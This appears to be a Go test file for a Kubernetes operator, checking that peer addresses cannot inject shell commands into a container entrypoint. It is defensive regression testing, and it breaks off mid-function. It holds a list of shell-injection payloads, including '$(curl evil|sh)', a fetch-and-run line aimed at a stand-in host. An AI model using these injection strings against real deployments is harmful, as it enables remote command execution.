/*
Copyright 2026 OramaSearch.
Licensed under the Apache License, Version 2.0.
*/

package controller

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"slices"
	"strconv"
	"strings"
	"testing"

	"github.com/go-logr/logr/funcr"
	appsv1 "k8s.io/api/apps/v1"
	corev1 "k8s.io/api/core/v1"
	apiextensionsv1 "k8s.io/apiextensions-apiserver/pkg/apis/apiextensions/v1"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	"k8s.io/apimachinery/pkg/api/meta"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/types"
	ctrl "sigs.k8s.io/controller-runtime"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"
	"sigs.k8s.io/controller-runtime/pkg/envtest"
	"sigs.k8s.io/yaml"

	oramav1alpha1 "github.com/oramasearch/orama-operator/api/v1alpha1"
)

// Tests for operator#279: peer addresses never become shell text, are validated from both sources, and
// the rendered entrypoint starts Zetta with exactly the argv the earlier string-built entrypoint did.

const testAdminToken = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"

// maliciousPeers are values an attacker could put in spec.externalPeers or an orama_control.topology row.
func maliciousPeers(marker string) []string {
	return []string{
		"x; touch " + marker,
		"$(touch " + marker + ")",
		"`touch " + marker + "`",
		"10.0.0.1:7777 --admin-token stolen",
		"'10.0.0.1:7777'",
		`"10.0.0.1:7777"`,
		"10.0.0.1:7777\ntouch " + marker,
		"10.0.0.1:7777 && touch " + marker,
		"10.0.0.1:7777|touch " + marker,
		"*",
		"--admin-token",
		"${ZETTA_ADMIN_TOKEN}:7777",
		"10.0.0.1:0",
		"10.0.0.1:65536",
		"10.0.0.1",
		":7777",
		"fd00::1:7777",
		"[not-ipv6]:7777",
		"host_name:7777",
		"-leading.example.com:7777",
	}
}

func TestValidateZettaPeerAddress(t *testing.T) {
	for _, ok := range []string{
		"10.0.0.1:7777", "1.2.3.4:1", "1.2.3.4:65535", "zetta.example.com:7777", "Zetta-0.Example.COM:7777",
		"localhost:7777", "[fd00::1]:7777", "[::1]:7777",
		"lake-prod-zetta-zetta-0.lake-prod-zetta-zetta-headless.lake.svc.cluster.local:7777",
	} {
		if err := validateZettaPeerAddress(ok); err != nil {
			t.Errorf("validateZettaPeerAddress(%q) = %v, want nil", ok, err)
		}
	}
	for _, bad := range append(maliciousPeers("/tmp/m"), "", "10.0.0.1:07777", "10.0.0.1:+80", "[::ffff:1.2.3.4]:7777",
		"[fe80::1%eth0]:7777", " 10.0.0.1:7777", "10.0.0.1:7777 ", strings.Repeat("a", 254)+":7777") {
		if err := validateZettaPeerAddress(bad); err == nil {
			t.Errorf("validateZettaPeerAddress(%q) = nil, want an error", bad)
		}
	}
	for _, ok := range []string{"9.9.9.9", "9.9.9.9:7777", "zetta.example.com", "fd00::1", "[fd00::1]", "[fd00::1]:7777"} {
		if err := validateZettaWANAddress(ok); err != nil {
			t.Errorf("validateZettaWANAddress(%q) = %v, want nil", ok, err)
		}
	}
	for _, bad := range []string{"9.9.9.9; id", "$(id)", "a,b", "9.9.9.9 --x"} {
		if err := validateZettaWANAddress(bad); err == nil {
			t.Errorf("validateZettaWANAddress(%q) = nil, want an error", bad)
		}
	}
}

// fakeZettaDir writes a `zetta` stub that records its argv (length-prefixed, so newlines survive) to
// $FAKE_ZETTA_OUT and the ZETTA_ADMIN_TOKEN it sees in its environment to $FAKE_ZETTA_OUT.env, and returns the directory to put first on PATH.
func fakeZettaDir(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	stub := "#!/bin/sh\n{ printf '%s\\n' \"$#\"; for a in \"$@\"; do printf '%s:%s\\n' \"${#a}\" \"$a\"; done; } > \"$FAKE_ZETTA_OUT\"\n" +
		"printf '%s' \"${ZETTA_ADMIN_TOKEN-<unset>}\" > \"$FAKE_ZETTA_OUT.env\"\n"
	if err := os.WriteFile(filepath.Join(dir, "zetta"), []byte(stub), 0o755); err != nil {
		t.Fatal(err)
	}
	return dir
}

func readFakeZettaArgv(t *testing.T, path string) []string {
	t.Helper()
	f, err := os.Open(path)
	if err != nil {
		t.Fatalf("zetta was never exec'd: %v", err)
	}
	defer f.Close()
	r := bufio.NewReader(f)
	line, err := r.ReadString('\n')
	if err != nil {
		t.Fatal(err)
	}
	n, err := strconv.Atoi(strings.TrimSpace(line))
	if err != nil {
		t.Fatal(err)
	}
	out := make([]string, 0, n)
	for i := 0; i < n; i++ {
		lenText, err := r.ReadString(':')
		if err != nil {
			t.Fatal(err)
		}
		size, err := strconv.Atoi(strings.TrimSuffix(lenText, ":"))
		if err != nil {
			t.Fatal(err)
		}
		buf := make([]byte, size+1)
		if _, err := io.ReadFull(r, buf); err != nil {
			t.Fatal(err)
		}
		out = append(out, string(buf[:size]))
	}
	return out
}

// testShells are the POSIX shells the entrypoint is run under: /bin/sh, plus dash when present — the Zetta
// image is Ubuntu, whose /bin/sh is dash, while a macOS /bin/sh is bash in POSIX mode.
func testShells() []string {
	shells := []string{"/bin/sh"}
	for _, s := range []string{"/bin/dash", "/usr/bin/dash", "/bin/busybox"} {
		if _, err := os.Stat(s); err == nil {
			shells = append(shells, s)
		}
	}
	return shells
}

// runZettaContainer executes the container's command+args exactly as the kubelet would, under every shell in
// testShells (all must agree), with the container's literal env plus the downward-API/Secret values from
// refs, and returns zetta's argv.
func runZettaContainer(t *testing.T, c corev1.Container, refs map[string]string) []string {
	t.Helper()
	argv, _ := runZettaNode(t, c, refs)
	return argv
}

// runZettaNode is runZettaContainer that also returns the ZETTA_ADMIN_TOKEN zetta saw in its environment
// ("<unset>" when absent).
func runZettaNode(t *testing.T, c corev1.Container, refs map[string]string) ([]string, string) {
	t.Helper()
	var first []string
	var firstToken string
	for i, shell := range testShells() {
		got, token := runZettaContainerWith(t, shell, c, refs)
		if i == 0 {
			first, firstToken = got, token
		} else if !slices.Equal(got, first) || token != firstToken {
			t.Fatalf("%s and /bin/sh disagree\n%s: %q %q\n/bin/sh: %q %q", shell, shell, got, token, first, firstToken)
		}
	}
	return first, firstToken
}

func runZettaContainerWith(t *testing.T, shell string, c corev1.Container, refs map[string]string) ([]string, string) {
	t.Helper()
	dir := fakeZettaDir(t)
	out := filepath.Join(t.TempDir(), "argv")
	env := []string{"PATH=" + dir + ":/usr/bin:/bin", "FAKE_ZETTA_OUT=" + out}
	for _, e := range c.Env {
		if e.ValueFrom == nil {
			env = append(env, e.Name+"="+e.Value)
		} else if v, ok := refs[e.Name]; ok {
			env = append(env, e.Name+"="+v)
		}
	}
	argv := append(slices.Clone(c.Command), c.Args...)
	if argv[0] == "/bin/sh" {
		argv[0] = shell
		if strings.HasSuffix(shell, "busybox") {
			argv = append([]string{shell, "sh"}, argv[1:]...)
		}
	}
	cmd := exec.Command(argv[0], argv[1:]...)
	cmd.Env = env
	cmd.Dir = t.TempDir()
	if output, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("entrypoint failed: %v\n%s", err, output)
	}
	token, err := os.ReadFile(out + ".env")
	if err != nil {
		t.Fatal(err)
	}
	return readFakeZettaArgv(t, out), string(token)
}

// withoutFlag removes every `flag <value>` pair from argv.
func withoutFlag(argv []string, flag string) []string {
	var out []string
	for i := 0; i < len(argv); i++ {
		if argv[i] == flag && i+1 < len(argv) {
			i++
			continue
		}
		out = append(out, argv[i])
	}
	return out
}

// legacyZettaEntrypoint is the entrypoint text the operator rendered before operator#279, copied with its comments removed
// (origin/main 8663901). It is the reference the equivalence test compares against; never use it elsewhere.
func legacyZettaEntrypoint(z *oramav1alpha1.OramaZettaCluster, headlessName, stsName string, derivedPeers []string) string {
	seed := fmt.Sprintf("%s-0.%s.%s.svc.cluster.local:%d", stsName, headlessName, z.Namespace, zettaPeerPort)
	extPeers := ""
	for _, p := range zettaPeerSet(z.Spec.ExternalPeers, derivedPeers) {
		extPeers += " --peer " + p
	}
	nodeFlags := " --node-type permanent"
	if z.Spec.Ephemeral {
		nodeFlags = " --node-type ephemeral"
	}
	if zettaReachability(z) == oramav1alpha1.ReachabilityDialOutOnly {
		nodeFlags += " --dial-out-only"
	}
	return fmt.Sprintf(`set -eu
ORD="${POD_NAME##*-}"   # NOT $HOSTNAME — under hostNetwork that is the node's name, not the pod's
PEER_PORT=%[2]d
API_PORT=%[3]d
SEED="%[4]s"
if [ "${ZETTA_HOST_NETWORK:-0}" = "1" ] && [ "$ORD" != "0" ]; then
  PEER_PORT=$((%[2]d + ORD))
  API_PORT=$((%[3]d + ORD))
  SEED="${HOST_IP}:%[2]d"
fi
A="--headless --data-dir %[1]s --listen 0.0.0.0:$PEER_PORT --mcp-listen 0.0.0.0:$API_PORT%[6]s"
if [ "$ORD" != "0" ]; then A="$A --peer $SEED"; fi
A="$A%[5]s"
ADV="${ZETTA_ADVERTISE_MAP:-}"
if [ -n "$ADV" ]; then
  N=$(echo "$ADV" | awk -F, '{print NF}')
  if [ "$N" = "1" ]; then MINE="$ADV"; else MINE=$(echo "$ADV" | cut -d, -f$((ORD+1))); fi
  [ -n "$MINE" ] && A="$A --advertise $MINE"
fi
echo "zetta node $POD_NAME (ordinal $ORD): zetta $A${ZETTA_CLUSTER_TOKEN:+ [join-token via env ****]}${ZETTA_ADMIN_TOKEN:+ --admin-token ****}"
if [ -n "${ZETTA_ADMIN_TOKEN:-}" ]; then A="$A --admin-token $ZETTA_ADMIN_TOKEN"; fi
exec zetta $A`, zettaDataDir, zettaPeerPort, zettaAPIPort, seed, extPeers, nodeFlags)
}

func renderZettaContainer(t *testing.T, z *oramav1alpha1.OramaZettaCluster, advertise string, derived []string) corev1.Container {
	t.Helper()
	r := &OramaZettaClusterReconciler{Scheme: zettaTestScheme(t)}
	stsName, headlessName, _ := zettaNames(z)
	sts := &appsv1.StatefulSet{ObjectMeta: metav1.ObjectMeta{Name: stsName, Namespace: z.Namespace}}
	if err := r.mutateZettaStatefulSet(z, sts, headlessName, stsName, zettaLabels(z), advertise, derived); err != nil {
		t.Fatalf("mutateZettaStatefulSet: %v", err)
	}
	return sts.Spec.Template.Spec.Containers[0]
}

func zettaRefs(z *oramav1alpha1.OramaZettaCluster, ord int) map[string]string {
	stsName, _, _ := zettaNames(z)
	return map[string]string{
		"POD_NAME":            fmt.Sprintf("%s-%d", stsName, ord),
		"ZETTA_CLUSTER_TOKEN": "cluster-token",
		"ZETTA_ADMIN_TOKEN":   testAdminToken,
		"HOST_IP":             "10.20.30.40",
	}
}

// devZettaClusters are the four OramaZettaClusters running on the dev AKS cluster on 2026-10-09 (read with
// `kubectl get oramazettaclusters -A`): one dial-out-only permanent node each, no peers, no operator schema.
func devZettaClusters() []*oramav1alpha1.OramaZettaCluster {
	off := false
	mk := func(ns, name string) *oramav1alpha1.OramaZettaCluster {
		return &oramav1alpha1.OramaZettaCluster{
			ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: ns, UID: types.UID("uid-" + name)},
			Spec: oramav1alpha1.OramaZettaClusterSpec{
				Image: "docker.io/oramasearch/zetta:dev-149303c1", Replicas: 1, RequireAuth: true,
				Reachability: oramav1alpha1.ReachabilityDialOutOnly, ProvisionOperatorSchema: &off,
				PullSecretName: "oramasearch-dockerhub",
				Env: []corev1.EnvVar{
					{Name: "ZETTA_MALLOC_TRIM_THRESHOLD_BYTES", Value: "67108864"},
					{Name: "MALLOC_ARENA_MAX", Value: "2"},
				},
			},
		}
	}
	return []*oramav1alpha1.OramaZettaCluster{
		mk("lake", "lake-prod-zetta"),
		mk("prod-ws-6bb777ba498a", "prod-ws-6bb777ba498a"),
		mk("prod-ws-787217d6ec44", "prod-ws-787217d6ec44"),
		mk("prod-ws-d2a67e5dcf36", "prod-ws-d2a67e5dcf36"),
	}
}

// TestZettaDevClustersGoldenArgv pins the argv the dev clusters' nodes start with: the argv their running
// pods were started with by the previous entrypoint (no peers, dial-out-only, permanent) minus
// `--admin-token <token>`, which now reaches zetta only through its environment (operator#279).
func TestZettaDevClustersGoldenArgv(t *testing.T) {
	want := []string{
		"--headless", "--data-dir", "/data", "--listen", "0.0.0.0:7777", "--mcp-listen", "0.0.0.0:4800",
		"--node-type", "permanent", "--dial-out-only",
	}
	for _, z := range devZettaClusters() {
		got, token := runZettaNode(t, renderZettaContainer(t, z, "", nil), zettaRefs(z, 0))
		if !slices.Equal(got, want) {
			t.Errorf("%s/%s argv\n got %q\nwant %q", z.Namespace, z.Name, got, want)
		}
		if token != testAdminToken {
			t.Errorf("%s/%s: zetta's ZETTA_ADMIN_TOKEN = %q, want the seeded token", z.Namespace, z.Name, token)
		}
	}
}

// TestZettaEntrypointMatchesLegacyArgv runs the old string-built entrypoint and the new one side by side for
// every valid shape (dev specs, multi-node, wan, hostNetwork, ephemeral, explicit + derived peers, IPv6) and
// every ordinal, and requires the exact same zetta argv except `--admin-token <token>`, which the old
// entrypoint passed as a flag and the new one leaves in the environment, where zetta must still see it.
func TestZettaEntrypointMatchesLegacyArgv(t *testing.T) {
	type tc struct {
		name      string
		z         *oramav1alpha1.OramaZettaCluster
		advertise string
		derived   []string
	}
	base := func(mut func(*oramav1alpha1.OramaZettaCluster)) *oramav1alpha1.OramaZettaCluster {
		z := newZettaTestCluster()
		mut(z)
		return z
	}
	cases := []tc{
		{name: "default three nodes", z: base(func(*oramav1alpha1.OramaZettaCluster) {})},
		{name: "wan with peers", z: base(func(z *oramav1alpha1.OramaZettaCluster) {
			z.Spec.Reachability = oramav1alpha1.ReachabilityWANAccessible
			z.Spec.WanAddress = "9.9.9.9"
			z.Spec.ExternalPeers = []string{"1.2.3.4:7777", " zetta.example.com:7777 ", "", "[fd00::1]:7777"}
		}), advertise: "9.9.9.9:7777,9.9.9.9:7777,9.9.9.9:7777", derived: []string{"5.6.7.8:7777", "1.2.3.4:7777"}},
		{name: "per-node advertise", z: base(func(z *oramav1alpha1.OramaZettaCluster) {
			z.Spec.Reachability = oramav1alpha1.ReachabilityWANAccessible
			z.Spec.ExposePeerLoadBalancer = true
		}), advertise: "1.1.1.1:7777,,3.3.3.3:7777"},
		{name: "single advertise", z: base(func(z *oramav1alpha1.OramaZettaCluster) {
			z.Spec.Reachability = oramav1alpha1.ReachabilityWANAccessible
		}), advertise: "4.4.4.4:7777"},
		{name: "hostNetwork packing", z: base(func(z *oramav1alpha1.OramaZettaCluster) {
			z.Spec.HostNetwork = true
			z.Spec.Reachability = oramav1alpha1.ReachabilityWANAccessible
		}), advertise: "10.20.30.40:7777,10.20.30.40:7777,10.20.30.40:7777", derived: []string{"8.8.8.8:7777"}},
		{name: "ephemeral", z: base(func(z *oramav1alpha1.OramaZettaCluster) {
			z.Spec.Ephemeral = true
			z.Spec.ExternalPeers = []string{"rendezvous.example.com:7777"}
		})},
	}
	for _, z := range devZettaClusters() {
		cases = append(cases, tc{name: "dev " + z.Name, z: z})
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			stsName, headlessName, _ := zettaNames(c.z)
			current := renderZettaContainer(t, c.z, c.advertise, c.derived)
			legacy := current
			legacy.Command = []string{"/bin/sh", "-c", legacyZettaEntrypoint(c.z, headlessName, stsName, c.derived)}
			legacy.Args = nil
			replicas := int(c.z.Spec.Replicas)
			if replicas < 1 {
				replicas = 1
			}
			for ord := 0; ord < replicas; ord++ {
				got, token := runZettaNode(t, current, zettaRefs(c.z, ord))
				legacyArgv := runZettaContainer(t, legacy, zettaRefs(c.z, ord))
				if !slices.Contains(legacyArgv, "--admin-token") {
					t.Fatalf("ordinal %d: the previous entrypoint should have passed --admin-token", ord)
				}
				want := withoutFlag(legacyArgv, "--admin-token")
				if slices.Contains(got, "--admin-token") || slices.Contains(got, testAdminToken) {
					t.Errorf("ordinal %d: the admin token is on the command line: %q", ord, got)
				}
				if token != testAdminToken {
					t.Errorf("ordinal %d: zetta's ZETTA_ADMIN_TOKEN = %q, want the seeded token", ord, token)
				}
				if !slices.Equal(got, want) {
					t.Errorf("ordinal %d argv differs from the previous entrypoint\n got %q\nwant %q", ord, got, want)
				}
			}
		})
	}
}

// TestZettaEntrypointScriptIsConstant: nothing from the CR reaches the script text — two very different
// clusters render byte-identical commands; everything variable is in Args or Env.
func TestZettaEntrypointScriptIsConstant(t *testing.T) {
	a := renderZettaContainer(t, devZettaClusters()[0], "", nil)
	zb := newZettaTestCluster()
	zb.Name, zb.Namespace, zb.Spec.Ephemeral = "other", "elsewhere", true
	zb.Spec.ExternalPeers = []string{"1.2.3.4:7777"}
	b := renderZettaContainer(t, zb, "5.5.5.5:7777", []string{"6.6.6.6:7777"})
	if !slices.Equal(a.Command, b.Command) || a.Command[2] != zettaEntrypointScript {
		t.Fatal("the entrypoint command differs between clusters — CR data is reaching the script text")
	}
	for _, s := range []string{"1.2.3.4", "6.6.6.6", "other", "elsewhere", "ephemeral"} {
		if strings.Contains(b.Command[2], s) {
			t.Errorf("script text contains CR value %q", s)
		}
	}
}

// TestZettaEntrypointNeverShellParsesValues feeds hostile values straight to the entrypoint script —
// bypassing validation — through every input it has: the peer args, the seed env, the advertise map and the
// admin token. None may run (the marker file must not appear), and each must reach zetta as one literal
// argv element. The previous entrypoint, given one of the same values, does run it: that is the bug.
func TestZettaEntrypointNeverShellParsesValues(t *testing.T) {
	marker := filepath.Join(t.TempDir(), "pwned")
	peers := maliciousPeers(marker)
	c := corev1.Container{
		Command: []string{"/bin/sh", "-c", zettaEntrypointScript},
		Args:    append([]string{zettaEntrypointName, "--node-type", "permanent", zettaArgsSeparator}, peers...),
		Env: []corev1.EnvVar{
			{Name: "POD_NAME", Value: "evil-zetta-1"},
			{Name: zettaSeedEnv, Value: "`touch " + marker + "`:7777"},
			{Name: "ZETTA_ADVERTISE_MAP", Value: "$(touch " + marker + ") *"},
			{Name: "ZETTA_ADMIN_TOKEN", Value: "tok; touch " + marker},
		},
	}
	got, token := runZettaNode(t, c, nil)
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("a hostile value was executed by the entrypoint shell")
	}
	want := []string{"--headless", "--data-dir", "/data", "--listen", "0.0.0.0:7777", "--mcp-listen", "0.0.0.0:4800",
		"--node-type", "permanent", "--peer", "`touch " + marker + "`:7777"}
	for _, p := range peers {
		want = append(want, "--peer", p)
	}
	want = append(want, "--advertise", "$(touch "+marker+") *")
	if !slices.Equal(got, want) {
		t.Errorf("hostile values were split, globbed or rewritten\n got %q\nwant %q", got, want)
	}
	if token != "tok; touch "+marker {
		t.Errorf("admin token in zetta's environment = %q, want it unchanged", token)
	}

	// Control: the pre-#279 entrypoint runs a peer's command substitution.
	z := newZettaTestCluster()
	z.Spec.ExternalPeers = []string{"$(touch " + marker + ")"}
	stsName, headlessName, _ := zettaNames(z)
	legacy := corev1.Container{
		Command: []string{"/bin/sh", "-c", legacyZettaEntrypoint(z, headlessName, stsName, nil)},
		Env:     []corev1.EnvVar{{Name: "POD_NAME", Value: "z0-zetta-0"}},
	}
	runZettaContainer(t, legacy, nil)
	if _, err := os.Stat(marker); err != nil {
		t.Fatal("control failed: the previous entrypoint should have executed the injected peer")
	}
}

// TestZettaStatefulSetDropsInvalidPeers: even if an invalid peer reached the renderer, it never lands in the
// pod spec; valid peers keep their order.
func TestZettaStatefulSetDropsInvalidPeers(t *testing.T) {
	z := newZettaTestCluster()
	z.Spec.ExternalPeers = append([]string{"1.2.3.4:7777"}, maliciousPeers("/tmp/m")...)
	c := renderZettaContainer(t, z, "", append([]string{"5.6.7.8:7777"}, maliciousPeers("/tmp/n")...))
	want := []string{zettaEntrypointName, "--node-type", "permanent", "--dial-out-only", zettaArgsSeparator,
		"1.2.3.4:7777", "5.6.7.8:7777"}
	if !slices.Equal(c.Args, want) {
		t.Errorf("args = %q, want %q", c.Args, want)
	}
}

// TestDeriveValidExternalPeersDropsHostileTopologyRows: a sibling operator (or anyone able to append to the
// shared orama_control.topology table) writes hostile addresses; they are dropped and reported, the valid
// sibling endpoint is kept.
func TestDeriveValidExternalPeersDropsHostileTopologyRows(t *testing.T) {
	rows := []topoRow{{operator: "op-B", cluster: "c", node: "good", address: "5.6.7.8:7777",
		reachability: oramav1alpha1.ReachabilityWANAccessible, status: topoStatusActive, updatedAt: "2026-10-09T00:00:00Z"}}
	for i, p := range maliciousPeers("/tmp/m") {
		rows = append(rows, topoRow{operator: "op-B", cluster: "c", node: fmt.Sprintf("evil-%02d", i), address: p,
			reachability: oramav1alpha1.ReachabilityWANAccessible, status: topoStatusActive, updatedAt: "2026-10-09T00:00:00Z"})
	}
	valid, dropped := deriveValidExternalPeers(rows, "op-A", "c", nil)
	if !slices.Equal(valid, []string{"5.6.7.8:7777"}) {
		t.Errorf("valid = %q, want only the good sibling", valid)
	}
	if len(dropped) != len(maliciousPeers("/tmp/m")) {
		t.Errorf("dropped %d hostile rows, want %d: %q", len(dropped), len(maliciousPeers("/tmp/m")), dropped)
	}
	cond := peerAddressesCondition(nil, dropped)
	if cond.Status != metav1.ConditionFalse || cond.Reason != "InvalidTopologyPeerDropped" {
		t.Errorf("condition = %+v", cond)
	}
	if strings.Contains(cond.Message, "\n") {
		t.Error("condition message carries a raw newline from a hostile value")
	}
	if again := peerAddressesCondition(nil, dropped); again.Message != cond.Message {
		t.Error("condition message is not deterministic")
	}
}

// TestReconcileRefusesInvalidSpecPeers: a CR written before the CRD pattern (a fake client does not apply
// it) with a hostile spec.externalPeers is refused — no StatefulSet is written, and an existing one is left
// exactly as it was — while the status says why.
func TestReconcileRefusesInvalidSpecPeers(t *testing.T) {
	ctx := context.Background()
	scheme := zettaTestScheme(t)
	off := false
	z := &oramav1alpha1.OramaZettaCluster{
		ObjectMeta: metav1.ObjectMeta{Name: "z0", Namespace: "orama-system", UID: types.UID("uid-z0")},
		Spec: oramav1alpha1.OramaZettaClusterSpec{
			Replicas: 1, ProvisionOperatorSchema: &off,
			ExternalPeers: []string{"1.2.3.4:7777", "$(curl evil|sh)"},
		},
	}
	existing := &appsv1.StatefulSet{
		ObjectMeta: metav1.ObjectMeta{Name: "z0-zetta", Namespace: "orama-system"},
		Spec: appsv1.StatefulSetSpec{
			Selector: &metav1.LabelSelector{MatchLabels: map[string]string{"a": "b"}},
			Template: corev1.PodTemplateSpec{
				ObjectMeta: metav1.ObjectMeta{Labels: map[string]string{"a": "b"}},
				Spec:       corev1.PodSpec{Containers: []corev1.Container{{Name: "zetta", Image: "last-good"}}},
			},
		},
	}
	cl := fake.NewClientBuilder().WithScheme(scheme).WithObjects(z, existing).
		WithStatusSubresource(&oramav1alpha1.OramaZettaCluster{}).Build()
	r := &OramaZettaClusterReconciler{Client: cl, Scheme: scheme}
	key := client.ObjectKeyFromObject(z)
	if _, err := r.Reconcile(ctx, ctrl.Request{NamespacedName: key}); err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	var sts appsv1.StatefulSet
	if err := cl.Get(ctx, client.ObjectKey{Namespace: "orama-system", Name: "z0-zetta"}, &sts); err != nil {
		t.Fatal(err)
	}
	if c := sts.Spec.Template.Spec.Containers[0]; c.Image != "last-good" || len(c.Command) != 0 || len(c.Args) != 0 {
		t.Fatalf("the StatefulSet was rewritten from a refused spec: %+v", c)
	}
	var got oramav1alpha1.OramaZettaCluster
	if err := cl.Get(ctx, key, &got); err != nil {
		t.Fatal(err)
	}
	cond := meta.FindStatusCondition(got.Status.Conditions, peerAddressesConditionType)
	if cond == nil || cond.Status != metav1.ConditionFalse || cond.Reason != "InvalidSpecPeerAddress" ||
		!strings.Contains(cond.Message, "spec.externalPeers[1]") {
		t.Fatalf("PeerAddressesValid = %+v", cond)
	}
	if got.Status.Phase != "Degraded" {
		t.Errorf("phase = %q, want Degraded", got.Status.Phase)
	}

	// Fixing the spec reconciles the StatefulSet and clears the condition.
	got.Spec.ExternalPeers = []string{"1.2.3.4:7777"}
	if err := cl.Update(ctx, &got); err != nil {
		t.Fatal(err)
	}
	if _, err := r.Reconcile(ctx, ctrl.Request{NamespacedName: key}); err != nil {
		t.Fatalf("Reconcile: %v", err)
	}
	if err := cl.Get(ctx, client.ObjectKey{Namespace: "orama-system", Name: "z0-zetta"}, &sts); err != nil {
		t.Fatal(err)
	}
	if args := sts.Spec.Template.Spec.Containers[0].Args; !slices.Contains(args, "1.2.3.4:7777") {
		t.Errorf("fixed spec: args = %q, want the valid peer", args)
	}
	if err := cl.Get(ctx, key, &got); err != nil {
		t.Fatal(err)
	}
	if cond := meta.FindStatusCondition(got.Status.Conditions, peerAddressesConditionType); cond == nil || cond.Status != metav1.ConditionTrue {
		t.Errorf("PeerAddressesValid after the fix = %+v, want True", cond)
	}
}

// TestZettaCRDRefusesInvalidPeers: the API server itself refuses a hostile spec.externalPeers or
// spec.wanAddress (the CRD pattern), and accepts valid ones.
func TestZettaCRDRefusesInvalidPeers(t *testing.T) {
	assets := os.Getenv("KUBEBUILDER_ASSETS")
	if assets == "" {
		t.Skip("KUBEBUILDER_ASSETS is required for the Zetta CRD envtest")
	}
	crdPath, err := filepath.Abs("../../config/crd/bases")
	if err != nil {
		t.Fatal(err)
	}
	env := &envtest.Environment{BinaryAssetsDirectory: assets, CRDDirectoryPaths: []string{crdPath}, ErrorIfCRDPathMissing: true}
	config, err := env.Start()
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if err := env.Stop(); err != nil {
			t.Errorf("stop envtest: %v", err)
		}
	})
	ctx := context.Background()
	kubeClient, err := client.New(config, client.Options{Scheme: zettaTestScheme(t)})
	if err != nil {
		t.Fatal(err)
	}
	mk := func(name string, peers []string, wan string) *oramav1alpha1.OramaZettaCluster {
		return &oramav1alpha1.OramaZettaCluster{
			ObjectMeta: metav1.ObjectMeta{Name: name, Namespace: "default"},
			Spec:       oramav1alpha1.OramaZettaClusterSpec{ExternalPeers: peers, WanAddress: wan},
		}
	}
	for i, p := range maliciousPeers("/tmp/m") {
		err := kubeClient.Create(ctx, mk(fmt.Sprintf("bad-peer-%d", i), []string{"1.2.3.4:7777", p}, ""))
		if !apierrors.IsInvalid(err) {
			t.Errorf("externalPeers %q: Create err = %v, want Invalid", p, err)
		}
	}
	for i, w := range []string{"9.9.9.9; id", "$(id)", "a,b", "9.9.9.9:70000"} {
		if err := kubeClient.Create(ctx, mk(fmt.Sprintf("bad-wan-%d", i), nil, w)); !apierrors.IsInvalid(err) {
			t.Errorf("wanAddress %q: Create err = %v, want Invalid", w, err)
		}
	}
	good := mk("good", []string{"1.2.3.4:7777", "zetta.example.com:65535", "[fd00::1]:7777"}, "fd00::2")
	if err := kubeClient.Create(ctx, good); err != nil {
		t.Errorf("valid peers refused: %v", err)
	}
}

// TestZettaCustomEnvReservesEngineProvisioningNames: spec.env may not set the engine's own provisioning env,
// which would add an unvalidated peer (ZETTA_SEED_PEER) or move the data dir off the PVC (ZETTA_DATA_DIR).
func TestZettaCustomEnvReservesEngineProvisioningNames(t *testing.T) {
	z := newZettaTestCluster()
	z.Spec.Env = []corev1.EnvVar{
		{Name: "ZETTA_SEED_PEER", Value: "$(curl evil|sh):7777"},
		{Name: "ZETTA_DATA_DIR", Value: "/tmp"},
		{Name: zettaSeedEnv, Value: "evil:7777"},
		{Name: "MALLOC_ARENA_MAX", Value: "2"},
	}
	c := renderZettaContainer(t, z, "", nil)
	for _, name := range []string{"ZETTA_SEED_PEER", "ZETTA_DATA_DIR"} {
		if findEnv(c.Env, name) != nil {
			t.Errorf("spec.env set the reserved %s", name)
		}
	}
	if seed := findEnv(c.Env, zettaSeedEnv); seed == nil || seed.Value != "z0-zetta-0.z0-zetta-headless.orama-system.svc.cluster.local:7777" {
		t.Errorf("%s = %+v, want the operator's seed", zettaSeedEnv, seed)
	}
	if findEnv(c.Env, "MALLOC_ARENA_MAX") == nil {
		t.Error("an ordinary spec.env entry was dropped")
	}
	_, ignored := zettaCustomEnv(z.Spec.Env)
	if want := []string{zettaSeedEnv, "ZETTA_DATA_DIR", "ZETTA_SEED_PEER"}; !slices.Equal(ignored, want) {
		t.Errorf("ignored = %q, want %q", ignored, want)
	}
}

// TestPeerAddressesConditionForClearsStaleSpecRefusal: once the spec is valid again, a stale
// InvalidSpecPeerAddress is cleared even on a round where the topology could not be read; any other condition
// is kept on such a round (no flapping), and a full round always decides.
func TestPeerAddressesConditionForClearsStaleSpecRefusal(t *testing.T) {
	withCond := func(reason string) *oramav1alpha1.OramaZettaCluster {
		z := newZettaTestCluster()
		meta.SetStatusCondition(&z.Status.Conditions, metav1.Condition{
			Type: peerAddressesConditionType, Status: metav1.ConditionFalse, Reason: reason, Message: "old"})
		return z
	}
	if c := peerAddressesConditionFor(withCond("InvalidSpecPeerAddress"), nil, nil, false); c == nil || c.Status != metav1.ConditionTrue {
		t.Errorf("stale spec refusal with a failed topology read: %+v, want True", c)
	}
	if c := peerAddressesConditionFor(withCond("InvalidTopologyPeerDropped"), nil, nil, false); c != nil {
		t.Errorf("failed topology read must leave a topology condition alone, got %+v", c)
	}
	if c := peerAddressesConditionFor(newZettaTestCluster(), nil, nil, false); c != nil {
		t.Errorf("failed topology read with no condition: %+v, want nil", c)
	}
	if c := peerAddressesConditionFor(withCond("InvalidTopologyPeerDropped"), []string{"x"}, nil, false); c == nil || c.Reason != "InvalidSpecPeerAddress" {
		t.Errorf("an invalid spec is reported whatever the topology read: %+v", c)
	}
	if c := peerAddressesConditionFor(withCond("InvalidTopologyPeerDropped"), nil, nil, true); c == nil || c.Status != metav1.ConditionTrue {
		t.Errorf("a full round with nothing dropped: %+v, want True", c)
	}
}

// TestInvalidSpecPeerMessageQuotesValues: the spec-invalid message carries hostile values only Go-quoted —
// no raw newline, and no unquoted copy inside the validation reason.
func TestInvalidSpecPeerMessageQuotesValues(t *testing.T) {
	z := newZettaTestCluster()
